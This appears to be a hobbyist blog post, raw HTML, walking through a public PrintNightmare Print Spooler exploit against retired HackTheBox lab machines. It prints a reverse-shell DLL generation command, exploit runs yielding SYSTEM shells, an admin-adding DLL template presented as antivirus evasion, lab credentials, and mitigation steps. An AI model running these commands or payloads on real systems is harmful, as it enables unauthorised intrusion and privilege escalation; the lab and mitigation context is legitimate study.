<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="index, follow"><title>Testing PrintNightmare on HTB Machines | Ef's log</title><meta name=keywords content="PrintNightmare,Windows,HackTheBox"><meta name=description content="Having fun with a Zero-Day vulnerability"><meta name=author content="Fahmi FJ"><link rel=canonical href=https://fahmifj.github.io/articles/testing-printnightmare-on-hackthebox/><meta name=google-site-verification content="LlCRq--iL8r1HTz1DMbMvQyX2lZjWD-KnwFeO_OWlg8"><link crossorigin=anonymous href=https://fahmifj.github.io/assets/css/stylesheet.min.b37aa310409495dbb7d318ae534d9cdfc024ea71960ccd37cdb347a8f9eb0622.css integrity="sha256-s3qjEECUldu30xiuU02c38Ak6nGWDM03zbNHqPnrBiI=" rel="preload stylesheet" as=style><link crossorigin=anonymous rel=preload as=fetch href=https://fahmifj.github.io/index.json><script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/search.min.2f98e6bd63d4b4790552a2fd8fdf9121b05beb3f6652b3216af158f45de23ed4.js integrity="sha256-L5jmvWPUtHkFUqL9j9+RIbBb6z9mUrMhavFY9F3iPtQ="></script>
<script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/highlight.min.22059b46810f6ad868c7821e09643fcd3324a7aece939a3b9d810ddf8cc89e0d.js integrity="sha256-IgWbRoEPathox4IeCWQ/zTMkp67Ok5o7nYEN34zIng0=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://fahmifj.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://fahmifj.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://fahmifj.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://fahmifj.github.io/apple-touch-icon.png><link rel=mask-icon href=https://fahmifj.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.111.2"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:#1d1e20;--entry:#2e2e33;--primary:rgba(255, 255, 255, 0.84);--secondary:rgba(255, 255, 255, 0.56);--tertiary:rgba(255, 255, 255, 0.16);--content:rgba(255, 255, 255, 0.74);--hljs-bg:#2e2e33;--code-bg:#37383e;--border:#333}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-PDN0GP97D1"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-PDN0GP97D1",{anonymize_ip:!1})}</script><meta property="og:title" content="Testing PrintNightmare on HTB Machines"><meta property="og:description" content="Having fun with a Zero-Day vulnerability"><meta property="og:type" content="article"><meta property="og:url" content="https://fahmifj.github.io/articles/testing-printnightmare-on-hackthebox/"><meta property="article:section" content="articles"><meta property="article:published_time" content="2021-07-17T13:52:01+07:00"><meta property="article:modified_time" content="2023-04-02T00:00:00+00:00"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/return/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/antique/"><meta name=twitter:card content="summary"><meta name=twitter:title content="Testing PrintNightmare on HTB Machines"><meta name=twitter:description content="Having fun with a Zero-Day vulnerability"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Articles","item":"https://fahmifj.github.io/articles/"},{"@type":"ListItem","position":2,"name":"Testing PrintNightmare on HTB Machines","item":"https://fahmifj.github.io/articles/testing-printnightmare-on-hackthebox/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Testing PrintNightmare on HTB Machines","name":"Testing PrintNightmare on HTB Machines","description":"Having fun with a Zero-Day vulnerability","keywords":["PrintNightmare","Windows","HackTheBox"],"articleBody":"On Twitter, I’ve been seeing a lot of tweets about a remote code execution vulnerability in the Windows Print Spooler service, known as PrintNightmare, that could be used for privilege escalation. Furthermore, this vulnerability affects all the Windows versions.\nCVE-2021-34527 has been assigned to the vulnerability. This vulnerability was accidentally disclosed by security researchers from China, Zhiniang Peng and Xuefeng Li, after Microsoft released a security patch on June 8, 2021 for CVE-2021-1675, which is also a remote code execution in the Print Spooler service. The researchers thought their finding was CVE-2021-1675, but it turned out to be different.\nIn this post, I want to play around with the PrintNightmare PoC to own Windows retired machines from HackTheBox. I’m neither an expert nor an infosec pro, so I won’t dive into any technical thing about the vulnerability.\nPreparation There are several PoC exploits out there for PrintNightmare, but I will use the one that created by Cube0x0.\nTo use the exploit, I will have to change my impacket version to the one that has been modified by Cube0x0. And to avoid conflict that could mess up other Python tools, I will use a Python virtual environment using virtualenv module. If you don’t have it, install with:\n$ python3 -m pip install virtualenv The exploit also requires a DLL for later to be loaded on the target machines. This DLL will be hosted on a Samba/SMB server, and it should be configured to allow anonymous access, so that the exploit can directly grab the DLL over SMB.\nWorking Directory To create a virtual environment, I will first create a working directory under /opt. I will just name it as printnightmare.\n→ kali@kali «opt» «10.10.14.75» $ mkdir printnightmare \u0026\u0026 cd printnightmare I will clone the cube0x0 impacket repo as well as the exploit (CVE-2021-1675-cube0x0) in the working directory.\n→ kali@kali «printnightmare» «10.10.14.75» $ git clone https://github.com/cube0x0/impacket \u0026\u0026 git clone https://github.com/cube0x0/CVE-2021-1675.git CVE-2021-1675-cube0x0 Next, I will create a virtual environment called impacket-venv using virtualenv.\n→ kali@kali «printnightmare» «10.10.14.75» $ virtualenv impacket-venv created virtual environment CPython3.9.2.final.0-64 in 614ms creator CPython3Posix(dest=/opt/printnightmare/impacket-venv, clear=False, no_vcs_ignore=False, global=False) seeder FromAppData(download=False, pip=bundle, setuptools=bundle, wheel=bundle, via=copy, app_data_dir=/home/kali/.local/share/virtualenv) added seed packages: pip==21.1.3, setuptools==57.1.0, wheel==0.36.2 activators BashActivator,CShellActivator,FishActivator,PowerShellActivator,PythonActivator,XonshActivator Then, I will activate the virtual environment with the following commands.\n→ kali@kali «printnightmare» «10.10.14.75» $ source impacket-venv/bin/activate Now I can just install the cube0x0 impacket safely.\n(impacket-venv) → kali@kali «printnightmare» «10.10.14.75» $ cd impacket \u0026\u0026 python3 setup.py install running install running bdist_egg running egg_info ...[SNIP]... DLL Payload I will create a dll folder first under the printnightmare folder.\n(impacket-venv) → kali@kali «printnightmare» «10.10.14.75» $ mkdir dll And then I will use msfvenom to generate reverse shell DLL .\n(impacket-venv) → kali@kali «dll» «10.10.14.75» $ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.75 LPORT=4444 -f dll \u003e revshell.dll [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 460 bytes Final size of dll file: 8704 bytes Samba Server Configuration The exploit repo includes a guide on how to configure a Samba server for hosting the DLL payload in the README file, so I will use that for reference.\nFirst, I will create a backup of the original Samba configuration file.\n(impacket-venv) → kali@kali «printnightmare» «10.10.14.75» $ sudo cp /etc/samba/smb.conf{,.bak} Then I will replace the entire smb.conf contents with the following:\n[global] server role = standalone server smb ports = 445 map to guest = bad user usershare allow guests = yes idmap config * : backend = tdb log file = /var/log/samba/log.%m max log size = 1000 logging = file [ef] comment = Samba path = /opt/printnightmare/dll guest ok = yes read only = no browsable = yes Lastly, I will start the Samba service.\n(impacket-venv) → kali@kali «printnightmare» «10.10.14.75» $ sudo systemctl start smbd Target Machines As stated previously, I will be using HackTheBox retired machines as the targets. Here are the retired Windows machines that I will use along with their low privilege users.\nTarget IP Low Priv Credentials [username:password] Active 10.10.10.100 svc_tgs:GPPstillStandingStrong2k18 Bastion 10.10.10.134 l4mpje:bureaulampje Heist 10.10.10.149 hazard:stealth1agent Forest 10.10.10.161 svc-alfresco:s3rvice Atom 10.10.10.237 jason:kidvscat_electron_@123 Target Scanning According to this blog post by Splunk Threat Researcher Team, there are three prerequisites for successful exploitation of PrintNightmare:\nPrint Spooler Service enabled on the target system Network connectivity to the target system (initial access has been obtained) Hash or password for a low privileged user (or computer) account Since no. 2 and no. 3 are satisfied already, now I just need to verify if the Print Spooler service enabled on the targets.\nAs instructed by the exploit author, I can use rpcdump.py to determine whether the Spooler service is running.\n$ rpcdump.py @[IP-ADDRESS] | egrep 'MS-RPRN|MS-PAR' I figured out that rpcclient can also be used to detect the availability of Print Spooler service by invoking enumprinters command. If the returned output is “Could not initialise spoolss”, then the Print Spooler is most likely to be disabled.\nThe following is a dirty bash script I created as a wrapper for checking via rpcdump.py and rpcclient in one run.\n#!/bin/sh targets=$1 if [ -z \"$targets\" ]; then echo \"[-] Usage\\t: $0 [Target file]\" echo \"[-] File format : :: | 127.0.0.1:foo:bar\" else for target in `cat $targets`; do ip=$(echo $target | cut -d ':' -f1) username=$(echo $target | cut -d ':' -f2) password=$(echo $target | cut -d ':' -f3) echo \" - [$ip] - \" impacket-rpcdump $ip | egrep 'MS-RPRN|MS-PAR' rpcclient -U \"$username%$password\" $ip -c \"enumprinters;quit\" done fi I saved the script as detect-nightmare.sh . I ran the script and it returned the following results.\n→ kali@kali «printnightmare» «10.10.14.75» $ ./detect-nightmare.sh target-machines - [10.10.10.100] - Protocol: [MS-RPRN]: Print System Remote Protocol Could not initialise spoolss. Error was NT_STATUS_OBJECT_NAME_NOT_FOUND - [10.10.10.134] - Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol Protocol: [MS-RPRN]: Print System Remote Protocol No printers returned. - [10.10.10.149] - Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol Protocol: [MS-RPRN]: Print System Remote Protocol No printers returned. - [10.10.10.161] - Could not initialise spoolss. Error was NT_STATUS_OBJECT_NAME_NOT_FOUND - [10.10.10.237] - Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol Protocol: [MS-RPRN]: Print System Remote Protocol No printers returned. Based on the results above, Active and Forest don’t seem to be vulnerable, but I will still test them out!\nExploitation 1st Attempt Active (failed) As expected, on Active the exploit is failed.\n(impacket-venv) → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:(main) $ python3 CVE-2021-1675.py active.htb/SVC_TGS:'GPPstillStandingStrong2k18'@10.10.10.100 '\\\\10.10.14.75\\ef\\revshell.dll' [*] Connecting to ncacn_np:10.10.10.100[\\PIPE\\spoolss] [-] Connection Failed Bastion (failed) I ran the exploit against Bastion, and it connected but then the DLL got removed by AV 😂.\n(impacket-venv) → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:(main) $ python3 CVE-2021-1675.py Bastion/l4mpje:'bureaulampje'@10.10.10.134 '\\\\10.10.14.75\\ef\\revshell.dll' [*] Connecting to ncacn_np:10.10.10.134[\\PIPE\\spoolss] [+] Bind OK [+] pDriverPath Found C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_1734185bdb8f8610\\Amd64\\UNIDRV.DLL [*] Executing \\??\\UNC\\10.10.14.75\\ef\\revshell.dll [*] Try 1... Traceback (most recent call last): ...[SNIP]... impacket.dcerpc.v5.rprn.DCERPCSessionError: RPRN SessionError: code: 0xe1 - ERROR_VIRUS_INFECTED - Operation did not complete successfully because the file contains a virus or potentially unwanted software Heist (success) On Heist, the exploit didn’t show any indication of a successful exploitation.\n(impacket-venv) → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:(main) $ python3 CVE-2021-1675.py heist/hazard:'stealth1agent'@10.10.10.149 '\\\\10.10.14.75\\ef\\revshell.dll' [*] Connecting to ncacn_np:10.10.10.149[\\PIPE\\spoolss] [+] Bind OK [+] pDriverPath Found C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_83aa9aebf5dffc96\\Amd64\\UNIDRV.DLL [*] Executing \\??\\UNC\\10.10.14.75\\ef\\revshell.dll [*] Try 1... [*] Stage0: 0 [*] Try 2... Traceback (most recent call last): ...[SNIP]... impacket.smb3.SessionError: SMB SessionError: STATUS_PIPE_CLOSING(The specified named pipe is in the closing state.) But strangely, I got a shell on my listener. I’ll try to figure this out in the Troubleshoot section.\n→ kali@kali «printnightmare» «10.10.14.75» $ nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.75] from (UNKNOWN) [10.10.10.149] 49700 Microsoft Windows [Version 10.0.17763.437] (c) 2018 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u003ewhoami whoami nt authority\\system C:\\Windows\\system32\u003ehostname hostname SupportDesk C:\\Windows\\system32\u003eipconfig ipconfig Windows IP Configuration Ethernet adapter Ethernet0 2: Connection-specific DNS Suffix . : IPv6 Address. . . . . . . . . . . : dead:beef::c138:bcba:454d:8b9c Link-local IPv6 Address . . . . . : fe80::c138:bcba:454d:8b9c%15 IPv4 Address. . . . . . . . . . . : 10.10.10.149 Subnet Mask . . . . . . . . . . . : 255.255.255.0 Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:271c%15 10.10.10.2 Forest (failed) Similar to Active, the exploit also failed on Forest.\n(impacket-venv) → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:(main) $ python3 CVE-2021-1675.py htb.local/svc-alfresco:'s3rvice'@10.10.10.161 '\\\\10.10.14.75\\ef\\revshell.dll' [*] Connecting to ncacn_np:10.10.10.161[\\PIPE\\spoolss] [-] Connection Failed Atom (success) On Atom, the exploit returned the same result as on Heist, no indication of a successful exploitation.\n(impacket-venv) → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:(main) $ python3 CVE-2021-1675.py ATOM/jason:'kidvscat_electron_@123'@10.10.10.237 '\\\\10.10.14.75\\ef\\revshell.dll' [*] Connecting to ncacn_np:10.10.10.237[\\PIPE\\spoolss] [+] Bind OK [+] pDriverPath Found C:\\WINDOWS\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_c62e9f8067f98247\\Amd64\\UNIDRV.DLL [*] Executing \\??\\UNC\\10.10.14.75\\ef\\revshell.dll [*] Try 1... [*] Stage0: 0 [*] Try 2... Traceback (most recent call last): ...[SNIP]... impacket.smbconnection.SessionError: SMB SessionError: STATUS_PIPE_CLOSING(The specified named pipe is in the closing state.) But then the DLL connected to my listener.\n→ kali@kali «printnightmare» «10.10.14.75» $ nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.75] from (UNKNOWN) [10.10.10.237] 62322 Microsoft Windows [Version 10.0.19042.906] (c) Microsoft Corporation. All rights reserved. C:\\WINDOWS\\system32\u003ewhoami whoami nt authority\\system C:\\WINDOWS\\system32\u003ehostname hostname ATOM C:\\WINDOWS\\system32\u003eipconfig ipconfig Windows IP Configuration Ethernet adapter Ethernet0: Connection-specific DNS Suffix . : IPv6 Address. . . . . . . . . . . : dead:beef::6036:234d:b46e:b7d Temporary IPv6 Address. . . . . . : dead:beef::6193:2da2:279d:6fea Temporary IPv6 Address. . . . . . : dead:beef::94cf:8412:6dc6:a8ed Link-local IPv6 Address . . . . . : fe80::6036:234d:b46e:b7d%6 IPv4 Address. . . . . . . . . . . : 10.10.10.237 Subnet Mask . . . . . . . . . . . : 255.255.255.0 Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:271c%6 10.10.10.2 Exploitation 2nd Attempt Changing DLL Payload I’m sure that the following error was caused by my DLL payload.\nimpacket.smb3.SessionError: SMB SessionError: STATUS_PIPE_CLOSING(The specified named pipe is in the closing state.) Instead of using the DLL to create a malicious user (so it’s just one-time load/execution/thread/I don’t know), I used the DLL for reverse shell, which requires it to maintain the pipe. Without digging deeper, this was my best guess atm.\nNow let’s see if changing the payload will get rid of the error.\nI will use the following script which I stole from this PoC script created by Caleb Stewart and John Hammond to generate a new DLL (I’m lazy to compile a new one from scratch) :\nTo generate the DLL, I’ll just invoke Get-NightmareDLL within a PowerShell session.\nPS /opt/PrintNightmare/dll\u003e Import-Module ./generate-nightmaredll.ps1 PS /opt/PrintNightmare/dll\u003e Get-NightmareDLL [+] Created payload at /opt/printnightmare/dll/nightmare.dll Now when I ran the exploit again on Atom, it didn’t crash this time, instead it showed the indication of a successful exploitation.\n(impacket-venv) → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:(main) ✗ $ python3 CVE-2021-1675.py ATOM/jason:'kidvscat_electron_@123'@10.10.10.237 '\\\\10.10.14.75\\ef\\nightmare.dll' [*] Connecting to ncacn_np:10.10.10.237[\\PIPE\\spoolss] [+] Bind OK [+] pDriverPath Found C:\\WINDOWS\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_c62e9f8067f98247\\Amd64\\UNIDRV.DLL [*] Executing \\??\\UNC\\10.10.14.75\\ef\\nightmare.dll [*] Try 1... [*] Stage0: 0 [*] Try 2... [*] Stage0: 0 [*] Stage2: 0 [+] Exploit Completed Now I can login with credentials of adm1n:P@ssw0rd (default credentials from the stolen payload) using evil-winrm.\n→ kali@kali «dll» «10.10.14.75» $ evil-winrm -i 10.10.10.237 -u 'adm1n' -p 'P@ssw0rd' Evil-WinRM shell v2.4 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\adm1n\\Documents\u003e whoami /groups | select-string \"Administrators\" NT AUTHORITY\\Local account and member of Administrators group Well-known group S-1-5-114 Mandatory group, Enabled by default, Enabled group BUILTIN\\Administrators Alias S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner *Evil-WinRM* PS C:\\Users\\adm1n\\Documents\u003e hostname ATOM AV Evasion with self-compile Another issue I ran into during the demo was that the payload got removed by Microsoft Defender on Bastion. Using a self compile DLL payload from BookHackTrick DLL templates can resolve this (I should do this earlier 😅🔨).\nThe following is the template that I use.\n// stolen from https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking#your-own // compile: x86_64-w64-mingw32-gcc add_user_1.c -shared -o add_user.dll #include #include #include void Entry (){ //Default function that is executed when the DLL is loaded system(\"cmd.exe /c net user iamf /add\"); system(\"cmd.exe /c net localgroup administrators iamf /add\"); } BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) { switch (ul_reason_for_call){ case DLL_PROCESS_ATTACH: CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0); break; case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; } The code can be compiled from Linux using mingw-w64 compiler (sudo apt install mingw-w64). I will run the following command to compile the DLL.\n$ x86_64-w64-mingw32-gcc add_user_1.c -shared -o add_user.dll On Bastion, although the exploit successfully evade the AV and the malicious user was added into the machine, I’m unable to login via WinRM. However, impacket-psexec worked.\nAnd I found out that Invoke-Command from localhost is allowed.\nSo, I guess the WinRM on Bastion was configured to only allow admin account for remote access. I couldn’t get the “right” keywords to google this. Below are what I’ve tried so far:\n$ winrm get winrm/config $ winrm get winrm/config/listener $ (Get-PSSessionConfiguration -Name Microsoft.PowerShell).Permission $ HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System $ reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f Mitigation Microsoft provided two options as workarounds to mitigate PrintNightmare:\nDisable Print Spooler service Disable inbound remote printing through Group Policy. Also, it is recommended to install KB5005010 patch. I have no idea to work with the second option from CLI, so I will demo the first one.\nDisable Print Spooler Service Based on Microsoft guidance, I need to determine if the Print Spooler Service is running by using Get-Service -Name Spooler in PowerShell. If the service is running, stop and disable it by running the following commands in PowerShell consecutively.\n$ Stop-Service -Name Spooler -Force $ Set-Service -Name Spooler -StartupType Disabled I will run that on Bastion.\n*Evil-WinRM* PS C:\\\u003e Get-Service -Name Spooler Status Name DisplayName ------ ---- ----------- Running Spooler Print Spooler *Evil-WinRM* PS C:\\\u003e Stop-Service -Name Spooler -Force *Evil-WinRM* PS C:\\\u003e Set-Service -Name Spooler -StartupType Disabled After disabling Spooler service, I ran the exploit again, but this time, it returned a “Connection Failed” message.\nThe workaround is worked! But, the downside is that you loss the ability to print from both local and remote 🙃.\nFor more detailed mitigation, you can go to this GitHub repo.\n","wordCount":"2321","inLanguage":"en","datePublished":"2021-07-17T13:52:01+07:00","dateModified":"2023-04-02T00:00:00Z","author":{"@type":"Person","name":"Fahmi FJ"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://fahmifj.github.io/articles/testing-printnightmare-on-hackthebox/"},"publisher":{"@type":"Organization","name":"Ef's log","logo":{"@type":"ImageObject","url":"https://fahmifj.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class="header sticky"><nav id=navbar class=nav><div class=logo><a href=https://fahmifj.github.io/ accesskey=h title="Fahmi FJ">F's log</a></div><ul id=menu onscroll=menu_on_scroll()><li><a href=https://fahmifj.github.io/articles/ title=articles>articles</a></li><li><a href=https://fahmifj.github.io/stories/ title=stories>stories</a></li><li><a href=https://fahmifj.github.io/ctf/ title=ctf>ctf</a></li><li><a href=https://fahmifj.github.io/series/ title=series>series</a></li><li><a href=https://fahmifj.github.io/archives/ title=archives>archives</a></li></ul><div class=search-container><div id=searchBox><input class=searchInput id=searchInput aria-label=search type=search><div class=searchResults-container><span class="search-results hidden" id=searchResults aria-label="search results"></span></div></div><button id=theme-toggle accesskey=t title><svg id="moon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></nav></header><div id=mask></div><main class=main><div class=content-wrapper><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://fahmifj.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://fahmifj.github.io/articles/>Articles</a></div><h1 class=post-title>Testing PrintNightmare on HTB Machines</h1><p class=post-description>Having fun with a Zero-Day vulnerability</p><div class=post-meta><span class=author>Fahmi FJ</span>&nbsp;&#183;&nbsp;<span class=date>July 17, 2021</span>&nbsp;&#183;&nbsp;<span class=meta-read>11 min read</span></div><hr><div class=series-info>Series:&nbsp;<a href=https://fahmifj.github.io/series/hacking-printers/>Hacking Printers</a></div></header><div class=post-content-container><aside class=toc><div class=inner><ul><li><a href=#preparation aria-label=Preparation>Preparation</a></li><li><a href=#target-machines aria-label="Target Machines">Target Machines</a></li><li><a href=#target-scanning aria-label="Target Scanning">Target Scanning</a></li><li><a href=#exploitation-1st-attempt aria-label="Exploitation 1st Attempt">Exploitation 1st Attempt</a><ul><li><a href=#active-failed aria-label="Active (failed)">Active (failed)</a></li><li><a href=#bastion-failed aria-label="Bastion (failed)">Bastion (failed)</a></li><li><a href=#heist-success aria-label="Heist (success)">Heist (success)</a></li><li><a href=#forest-failed aria-label="Forest (failed)">Forest (failed)</a></li><li><a href=#atom-success aria-label="Atom (success)">Atom (success)</a></li></ul></li><li><a href=#exploitation-2nd-attempt aria-label="Exploitation 2nd Attempt">Exploitation 2nd Attempt</a></li><li><a href=#mitigation aria-label=Mitigation>Mitigation</a></li></ul></div></aside><div class=post-content><p>On Twitter, I&rsquo;ve been seeing a lot of tweets about a remote code execution vulnerability in the Windows Print Spooler service, known as PrintNightmare, that could be used for privilege escalation. Furthermore, this vulnerability affects all the Windows versions.</p><p>CVE-2021-34527 has been assigned to the vulnerability. This vulnerability was accidentally disclosed by security researchers from China, Zhiniang Peng and Xuefeng Li, after Microsoft released a security patch on June 8, 2021 for CVE-2021-1675, which is also a remote code execution in the Print Spooler service. The researchers thought their finding was CVE-2021-1675, but it turned out to be different.</p><p>In this post, I want to play around with the PrintNightmare PoC to own Windows <a href=https://www.hackthebox.eu/newsroom/htb-take-it-easy-july-2021>retired machines</a> from <a href=http://hackthebox.eu/>HackTheBox</a>. I’m neither an expert nor an infosec pro, so I won’t dive into any technical thing about the vulnerability.</p><h2 id=preparation>Preparation<a class=anchor aria-hidden=true href=#preparation>#</a></h2><p>There are several PoC exploits out there for PrintNightmare, but I will use the one that created by <a href=https://www.hackthebox.eu/profile/9164>Cube0x0</a>.</p><p>To use the exploit, I will have to change my impacket version to the one that has been modified by Cube0x0. And to avoid conflict that could mess up other Python tools, I will use a Python virtual environment using <code>virtualenv</code> module. If you don&rsquo;t have it, install with:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ python3 -m pip install virtualenv
</span></span></code></pre></div><p>The exploit also requires a DLL for later to be loaded on the target machines. This DLL will be hosted on a Samba/SMB server, and it should be configured to allow anonymous access, so that the exploit can directly grab the DLL over SMB.</p><h4 id=working-directory>Working Directory<a class=anchor aria-hidden=true href=#working-directory>#</a></h4><p>To create a virtual environment, I will first create a working directory under <code>/opt</code>. I will just name it as <code>printnightmare</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «opt» «10.10.14.75» 
</span></span><span class=line><span class=cl>$ mkdir printnightmare <span class=o>&amp;&amp;</span> <span class=nb>cd</span> printnightmare
</span></span></code></pre></div><p>I will clone the cube0x0 impacket repo as well as the exploit (<code>CVE-2021-1675-cube0x0</code>) in the working directory.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «printnightmare» «10.10.14.75» 
</span></span><span class=line><span class=cl>$ git clone https://github.com/cube0x0/impacket <span class=o>&amp;&amp;</span> git clone https://github.com/cube0x0/CVE-2021-1675.git CVE-2021-1675-cube0x0
</span></span></code></pre></div><p>Next, I will create a virtual environment called <code>impacket-venv</code> using <code>virtualenv</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «printnightmare» «10.10.14.75» 
</span></span><span class=line><span class=cl>$ virtualenv impacket-venv
</span></span><span class=line><span class=cl>created virtual environment CPython3.9.2.final.0-64 in 614ms
</span></span><span class=line><span class=cl>  creator CPython3Posix<span class=o>(</span><span class=nv>dest</span><span class=o>=</span>/opt/printnightmare/impacket-venv, <span class=nv>clear</span><span class=o>=</span>False, <span class=nv>no_vcs_ignore</span><span class=o>=</span>False, <span class=nv>global</span><span class=o>=</span>False<span class=o>)</span>
</span></span><span class=line><span class=cl>  seeder FromAppData<span class=o>(</span><span class=nv>download</span><span class=o>=</span>False, <span class=nv>pip</span><span class=o>=</span>bundle, <span class=nv>setuptools</span><span class=o>=</span>bundle, <span class=nv>wheel</span><span class=o>=</span>bundle, <span class=nv>via</span><span class=o>=</span>copy, <span class=nv>app_data_dir</span><span class=o>=</span>/home/kali/.local/share/virtualenv<span class=o>)</span>
</span></span><span class=line><span class=cl>    added seed packages: <span class=nv>pip</span><span class=o>==</span>21.1.3, <span class=nv>setuptools</span><span class=o>==</span>57.1.0, <span class=nv>wheel</span><span class=o>==</span>0.36.2
</span></span><span class=line><span class=cl>  activators BashActivator,CShellActivator,FishActivator,PowerShellActivator,PythonActivator,XonshActivator
</span></span></code></pre></div><p>Then, I will activate the virtual environment with the following commands.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «printnightmare» «10.10.14.75» 
</span></span><span class=line><span class=cl>$ <span class=nb>source</span> impacket-venv/bin/activate
</span></span></code></pre></div><p>Now I can just install the cube0x0 impacket safely.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=o>(</span>impacket-venv<span class=o>)</span> → kali@kali «printnightmare» «10.10.14.75» 
</span></span><span class=line><span class=cl>$ <span class=nb>cd</span> impacket <span class=o>&amp;&amp;</span> python3 setup.py install
</span></span><span class=line><span class=cl>running install
</span></span><span class=line><span class=cl>running bdist_egg
</span></span><span class=line><span class=cl>running egg_info
</span></span><span class=line><span class=cl>...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span></code></pre></div><h4 id=dll-payload>DLL Payload<a class=anchor aria-hidden=true href=#dll-payload>#</a></h4><p>I will create a <code>dll</code> folder first under the <code>printnightmare</code> folder.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=o>(</span>impacket-venv<span class=o>)</span> → kali@kali «printnightmare» «10.10.14.75» 
</span></span><span class=line><span class=cl>$ mkdir dll
</span></span></code></pre></div><p>And then I will use <code>msfvenom</code> to generate reverse shell DLL .</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=o>(</span>impacket-venv<span class=o>)</span> → kali@kali «dll» «10.10.14.75» 
